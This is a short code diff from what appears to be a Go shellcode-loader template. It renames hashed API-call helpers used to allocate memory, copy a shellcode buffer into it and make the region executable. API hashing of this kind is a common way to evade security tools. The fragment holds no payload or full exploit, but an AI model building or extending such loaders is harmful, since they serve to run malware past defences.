@@ -89,7 +89,7 @@ func (t SysTemplate) Process() string {
 		log.Fatal(err)
 	}
 
-    addr = loader.HashedSyscall(
+    addr = loader.HashedCall(
         VirtualAlloc,
         0,
         regionSize,
@@ -106,7 +106,7 @@ func (t SysTemplate) Process() string {
 		log.Fatal(err)
 	}
 
-    rvalue := loader.HashedSyscall(
+    rvalue := loader.HashedCall(
         RtlCopyMemory,
         addr,
         (uintptr)(unsafe.Pointer(&shellcode[0])),
@@ -121,7 +121,7 @@ func (t SysTemplate) Process() string {
 		log.Fatal(err)
 	}
 
-    rvalue := loader.HashedSyscall(
+    rvalue := loader.HashedCall(
         VirtualProtect,
         addr,
         regionsize,
